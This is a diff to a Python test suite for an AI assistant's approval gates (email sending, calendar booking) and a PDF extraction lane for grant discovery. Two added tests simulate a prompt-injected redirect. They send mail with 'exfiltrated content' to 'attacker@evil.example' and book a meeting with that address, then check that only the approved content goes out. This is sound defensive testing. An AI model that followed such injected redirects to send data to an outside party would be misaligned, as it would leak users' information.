@@ -57,26 +57,36 @@ class TestChecklist:
 class TestApprovalGate:
     async def test_full_lifecycle(self, fake_store):
         aid = "app1"
-        req = await approval_service.request_approval(aid)
+        req = await approval_service.request_approval(
+            aid, founder_id="founder", session_id="session-1")
         assert "token" not in str(req)  # never the token
 
-        blocked = await approval_service.resolve_for_submit(aid)
+        blocked = await approval_service.resolve_for_submit(
+            aid, founder_id="founder", session_id="session-1")
         assert blocked["status"] == "error"  # PENDING ≠ GRANTED
 
-        await approval_service.resolve(req["approval_id"], "grant", "founder")
-        ok = await approval_service.resolve_for_submit(aid)
+        await approval_service.resolve(
+            req["approval_id"], "grant", "founder", "session-1")
+        ok = await approval_service.resolve_for_submit(
+            aid, founder_id="founder", session_id="session-1")
         assert ok["status"] == "success"
-        await approval_service.consume(ok["approval_id"])
 
-        blocked2 = await approval_service.resolve_for_submit(aid)
+        # Claim no longer consumes — the side effect's success does (a failed
+        # submit must not burn the approval). After consume, the gate refuses.
+        await approval_service.consume(ok["approval_id"])
+        blocked2 = await approval_service.resolve_for_submit(
+            aid, founder_id="founder", session_id="session-1")
         assert blocked2["status"] == "error"  # CONSUMED is final
         refused = [r for r in fake_store.audit if r["result"] == "refused"]
         assert len(refused) == 2  # both blocked attempts audited
 
     async def test_double_resolve_refused(self, fake_store):
-        req = await approval_service.request_approval("app1")
-        await approval_service.resolve(req["approval_id"], "deny", "founder")
-        again = await approval_service.resolve(req["approval_id"], "grant", "founder")
+        req = await approval_service.request_approval(
+            "app1", founder_id="founder", session_id="session-1")
+        await approval_service.resolve(
+            req["approval_id"], "deny", "founder", "session-1")
+        again = await approval_service.resolve(
+            req["approval_id"], "grant", "founder", "session-1")
         assert again["status"] == "error"
 
 
@@ -365,6 +375,107 @@ class TestSweep:
         assert fake_store.opportunities["o1"]["urgency"]["tier"] == "CRITICAL"
 
 
+class TestDiscoveryPdfLane:
+    """PDF sources must be extracted from the PDF BYTES via document
+    understanding — never from the placeholder text artifact (docs/08; this
+    lane was broken end-to-end before extract_records grew the dispatch)."""
+
+    PDF_BYTES = b"%PDF-1.7 fake guidelines document"
+
+    def _workflow(self):
+        from types import SimpleNamespace
+        return SimpleNamespace(
+            sources=[{"type": "pdf", "url": "https://grants.example/guide.pdf"}],
+            entity_schema={"name": {}, "application_url": {}, "award": {},
+                           "deadline": {}})
+
+    def _wire(self, tmp_path, monkeypatch, pdf_records):
+        from services import storage
+        monkeypatch.setattr("services.storage._root", lambda: str(tmp_path))
+
+        async def _fetch(url, source_type, artifact):
+            storage.save_bytes(artifact.replace(".txt", ".pdf"), self.PDF_BYTES)
+            storage.save_text(artifact, "[PDF source placeholder]")
+            return {"status": "success", "artifact": artifact, "summary": "",
+                    "chars": 30, "rendered": False, "links": []}
+        monkeypatch.setattr(discovery_service, "fetch_source", _fetch)
+
+        seen = {"pdf_calls": 0, "bytes": None}
+
+        def _pdf_extract(data, schema):
+            seen["pdf_calls"] += 1
+            seen["bytes"] = data
+            return pdf_records
+        discovery_service.set_pdf_extract_fn(_pdf_extract)
+
+        def _text_extract(text, schema):
+            raise AssertionError(
+                "text extractor must never run for a pdf source")
+        discovery_service.set_extract_fn(_text_extract)
+        return seen
+
+    def teardown_method(self):
+        discovery_service.set_search_fn(None)
+        discovery_service.set_extract_fn(None)
+        discovery_service.set_pdf_extract_fn(None)
+
+    async def test_pdf_source_extracts_from_pdf_bytes(
+            self, fake_store, tmp_path, monkeypatch):
+        seen = self._wire(tmp_path, monkeypatch, pdf_records=[
+            {"name": "Pre-Accelerator Grants",
+             "application_url": "https://grants.example/apply",
+             "award": "$50k", "deadline": "2026-11-30",
+             "raw_excerpt": "Grants of up to $50,000..."}])
+        result = await discovery_service.run_sweep(self._workflow(), "f1")
+        assert result["status"] == "success"
+        assert result["saved"] == 1
+        assert seen["pdf_calls"] == 1
+        assert seen["bytes"] == self.PDF_BYTES  # the document, not the placeholder
+        saved = list(fake_store.opportunities.values())[0]
+        assert saved["source_type"] == "pdf"
+        assert saved["raw_excerpt"].startswith("Grants of up to")
+
+    async def test_pdf_unchanged_bytes_skip_extraction(
+            self, fake_store, tmp_path, monkeypatch):
+        seen = self._wire(tmp_path, monkeypatch, pdf_records=[
+            {"name": "Pre-Accelerator Grants",
+             "application_url": "https://grants.example/apply"}])
+        await discovery_service.run_sweep(self._workflow(), "f1")
+        second = await discovery_service.run_sweep(self._workflow(), "f1")
+        assert seen["pdf_calls"] == 1  # identical bytes → model not paid twice
+        assert second["unchanged"] == 1
+
+    async def test_extract_records_prefers_pdf_sibling(
+            self, tmp_path, monkeypatch):
+        from services import storage
+        monkeypatch.setattr("services.storage._root", lambda: str(tmp_path))
+        storage.save_text("source_ab.txt", "text body")
+        storage.save_bytes("source_ab.pdf", self.PDF_BYTES)
+        discovery_service.set_pdf_extract_fn(
+            lambda data, schema: [{"name": "FromPdf"}])
+        discovery_service.set_extract_fn(
+            lambda text, schema: [{"name": "FromText"}])
+        got = await discovery_service.extract_records("source_ab.txt", {"name": {}})
+        assert got["records"][0]["name"] == "FromPdf"
+        assert got["source"] == "pdf"
+        # no sibling → the text path
+        storage.save_text("source_cd.txt", "text body")
+        got = await discovery_service.extract_records("source_cd.txt", {"name": {}})
+        assert got["records"][0]["name"] == "FromText"
+
+    async def test_pdf_lane_without_backend_is_error_data(
+            self, tmp_path, monkeypatch):
+        from services import storage
+        monkeypatch.setattr("services.storage._root", lambda: str(tmp_path))
+        storage.save_text("source_ef.txt", "placeholder")
+        storage.save_bytes("source_ef.pdf", self.PDF_BYTES)
+        discovery_service.set_pdf_extract_fn(None)
+        discovery_service.set_extract_fn(lambda text, schema: [{"name": "X"}])
+        got = await discovery_service.extract_records("source_ef.txt", {"name": {}})
+        assert got["status"] == "error"
+        assert "not configured" in got["message"]
+
+
 # ---- integrations: Drive + Gmail adapters (docs/06, 07, 12) ---------------
 
 class _FakeReq:
@@ -573,17 +684,19 @@ class TestAlexMailbox:
     async def test_send_refused_without_approval(self, monkeypatch):
         sent = []
         alex_mailbox.set_service_factory(lambda: _FakeAlexGmail(_FakeAlexMessages(sent=sent)))
-        async def _none(target): return None
+        async def _none(target, **kwargs): return None
         monkeypatch.setattr("services.alex_mailbox.firestore.find_valid_approval", _none)
         monkeypatch.setattr("services.alex_mailbox.firestore.find_pending_approval", _none)
-        async def _req(target, gate, details=None):
+        async def _req(target, gate, details=None, **kwargs):
             assert gate == "send_email"
             assert details and details["to"] == "program@example.org"
             return {"status": "success", "approval_id": "ap1"}
         monkeypatch.setattr("services.approval_service.request_approval", _req)
         async def _audit(*a, **k): pass
         monkeypatch.setattr("services.alex_mailbox.firestore.audit", _audit)
-        result = await alex_mailbox.send_email("program@example.org", "Question", "Hi")
+        result = await alex_mailbox.send_email(
+            "program@example.org", "Question", "Hi",
+            founder_id="founder", session_id="session-1")
         assert result["status"] == "needs_approval" and result["error"] is True
         assert sent == []  # nothing left the building
 
@@ -591,13 +704,17 @@ class TestAlexMailbox:
         sent = []
         consumed = []
         alex_mailbox.set_service_factory(lambda: _FakeAlexGmail(_FakeAlexMessages(sent=sent)))
-        async def _valid(target): return {"id": "ap1"}
+        async def _valid(target, **kwargs): return {"id": "ap1"}
         monkeypatch.setattr("services.alex_mailbox.firestore.find_valid_approval", _valid)
-        async def _consume(aid): consumed.append(aid)
-        monkeypatch.setattr("services.alex_mailbox.firestore.consume_approval", _consume)
+        async def _claim(aid):
+            consumed.append(aid)
+            return True
+        monkeypatch.setattr("services.alex_mailbox.firestore.claim_approval", _claim)
         async def _audit(*a, **k): pass
         monkeypatch.setattr("services.alex_mailbox.firestore.audit", _audit)
-        result = await alex_mailbox.send_email("program@example.org", "Question", "Hi")
+        result = await alex_mailbox.send_email(
+            "program@example.org", "Question", "Hi",
+            founder_id="founder", session_id="session-1")
         assert result["status"] == "success" and result["message_id"] == "sent-1"
         assert len(sent) == 1 and consumed == ["ap1"]
 
@@ -605,6 +722,38 @@ class TestAlexMailbox:
         alex_mailbox.set_service_factory(lambda: _FakeAlexGmail(_FakeAlexMessages()))
         result = await alex_mailbox.send_email("not-an-email", "Hi", "Body")
         assert result["status"] == "error" and "recipient" in result["message"]
+
+    async def test_approval_is_content_bound_not_just_gate_bound(self, monkeypatch):
+        """A granted approval carries the approved to/subject/body — a later
+        call with DIFFERENT arguments (e.g. a prompt-injected redirect) must
+        send the approved message, never the new one."""
+        sent = []
+        alex_mailbox.set_service_factory(lambda: _FakeAlexGmail(_FakeAlexMessages(sent=sent)))
+        async def _valid(target, **kwargs):
+            return {"id": "ap1", "details": {"to": "program@example.org",
+                                             "subject": "Question",
+                                             "body": "Hi — approved text"}}
+        monkeypatch.setattr("services.alex_mailbox.firestore.find_valid_approval", _valid)
+        async def _claim(aid): return True
+        monkeypatch.setattr("services.alex_mailbox.firestore.claim_approval", _claim)
+        audits = []
+        async def _audit(*a, **k): audits.append(a)
+        monkeypatch.setattr("services.alex_mailbox.firestore.audit", _audit)
+        result = await alex_mailbox.send_email(
+            "attacker@evil.example", "New subject", "exfiltrated content",
+            founder_id="founder", session_id="session-1")
+        assert result["status"] == "success"
+        assert "program@example.org" in result["message"]
+        import base64 as _b64
+        import email as _email
+        msg = _email.message_from_string(
+            _b64.urlsafe_b64decode(sent[0]["raw"]).decode())
+        assert msg["to"] == "program@example.org"
+        assert msg["subject"] == "Question"
+        body_text = msg.get_payload(decode=True).decode()
+        assert body_text == "Hi — approved text"
+        assert "exfiltrated" not in body_text
+        assert any("drift_ignored" in a for a in audits)
 
     async def test_scan_classifies_and_dedupes(self, monkeypatch):
         processed = []
@@ -654,7 +803,9 @@ class TestAlexMailbox:
 
 
 class _FakeCalendarInsertEvents(_FakeCalendarEvents):
-    def __init__(self, inserted): super().__init__([]); self.inserted = inserted
+    def __init__(self, inserted):
+            super().__init__([])
+            self.inserted = inserted
     def insert(self, calendarId, body, conferenceDataVersion, sendUpdates):
         self.inserted.append(body)
         return _FakeReq({"id": "evt-1", "hangoutLink": "https://meet.google.com/abc-defg-hij"})
@@ -673,10 +824,10 @@ class TestCalendarBooking:
     async def test_booking_refused_without_approval(self, monkeypatch):
         inserted = []
         calendar_adapter.set_service_factory(lambda: _FakeCalendarInsert(inserted))
-        async def _none(target): return None
+        async def _none(target, **kwargs): return None
         monkeypatch.setattr("services.calendar_adapter.firestore.find_valid_approval", _none)
         monkeypatch.setattr("services.calendar_adapter.firestore.find_pending_approval", _none)
-        async def _req(target, gate, details=None):
+        async def _req(target, gate, details=None, **kwargs):
             assert gate == "book_meeting"
             assert details["attendees"] == ["investor@fund.com"]
             return {"status": "success", "approval_id": "ap1"}
@@ -685,22 +836,24 @@ class TestCalendarBooking:
         monkeypatch.setattr("services.calendar_adapter.firestore.audit", _audit)
         result = await calendar_adapter.create_event(
             "Intro call", "2026-08-25T14:00:00+01:00", "2026-08-25T14:30:00+01:00",
-            ["investor@fund.com"])
+            ["investor@fund.com"], founder_id="founder", session_id="session-1")
         assert result["status"] == "needs_approval" and result["error"] is True
         assert inserted == []  # nothing on the calendar
 
     async def test_booking_with_approval_inserts_and_consumes(self, monkeypatch):
         inserted, consumed = [], []
         calendar_adapter.set_service_factory(lambda: _FakeCalendarInsert(inserted))
-        async def _valid(target): return {"id": "ap1"}
+        async def _valid(target, **kwargs): return {"id": "ap1"}
         monkeypatch.setattr("services.calendar_adapter.firestore.find_valid_approval", _valid)
-        async def _consume(aid): consumed.append(aid)
-        monkeypatch.setattr("services.calendar_adapter.firestore.consume_approval", _consume)
+        async def _claim(aid):
+            consumed.append(aid)
+            return True
+        monkeypatch.setattr("services.calendar_adapter.firestore.claim_approval", _claim)
         async def _audit(*a, **k): pass
         monkeypatch.setattr("services.calendar_adapter.firestore.audit", _audit)
         result = await calendar_adapter.create_event(
             "Intro call", "2026-08-25T14:00:00+01:00", "2026-08-25T14:30:00+01:00",
-            ["investor@fund.com"])
+            ["investor@fund.com"], founder_id="founder", session_id="session-1")
         assert result["status"] == "success"
         assert result["meet_link"] == "https://meet.google.com/abc-defg-hij"
         assert inserted[0]["attendees"] == [{"email": "investor@fund.com"}]
@@ -713,3 +866,31 @@ class TestCalendarBooking:
         back = await calendar_adapter.create_event(
             "X", "2026-08-25T15:00:00+01:00", "2026-08-25T14:30:00+01:00", ["a@b.co"])
         assert back["status"] == "error" and "after start" in back["message"]
+
+    async def test_booking_is_content_bound_not_just_gate_bound(self, monkeypatch):
+        """A granted approval books EXACTLY the approved meeting — a later
+        call with different attendees/times must not override it."""
+        inserted = []
+        calendar_adapter.set_service_factory(lambda: _FakeCalendarInsert(inserted))
+        async def _valid(target, **kwargs):
+            return {"id": "ap1", "details": {
+                "summary": "Intro call",
+                "start": "2026-08-25T14:00:00+01:00",
+                "end": "2026-08-25T14:30:00+01:00",
+                "attendees": ["investor@fund.com"]}}
+        monkeypatch.setattr("services.calendar_adapter.firestore.find_valid_approval", _valid)
+        async def _claim(aid): return True
+        monkeypatch.setattr("services.calendar_adapter.firestore.claim_approval", _claim)
+        audits = []
+        async def _audit(*a, **k): audits.append(a)
+        monkeypatch.setattr("services.calendar_adapter.firestore.audit", _audit)
+        result = await calendar_adapter.create_event(
+            "Totally different meeting", "2026-08-26T09:00:00+01:00",
+            "2026-08-26T10:00:00+01:00", ["attacker@evil.example"],
+            founder_id="founder", session_id="session-1")
+        assert result["status"] == "success"
+        booked = inserted[0]
+        assert booked["summary"] == "Intro call"
+        assert booked["attendees"] == [{"email": "investor@fund.com"}]
+        assert booked["start"]["dateTime"].startswith("2026-08-25T14:00")
+        assert any("drift_ignored" in a for a in audits)
